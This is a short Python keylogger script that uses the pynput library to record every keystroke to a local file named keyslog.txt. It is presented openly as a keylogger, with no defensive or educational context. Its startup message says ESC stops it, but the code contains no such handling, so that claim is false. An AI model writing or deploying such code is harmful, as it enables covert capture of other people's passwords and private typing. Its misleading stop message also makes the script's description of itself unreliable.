from pynput import keyboard

def on_press(key):
    try:
        with open("keyslog.txt", "a") as log_file:
            log_file.write(f'{key.char}\n')
    except AttributeError:
        with open("keyslog.txt", "a") as log_file:
            log_file.write(f'[{key}]\n')

def main():
    print("Starting keylogger. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()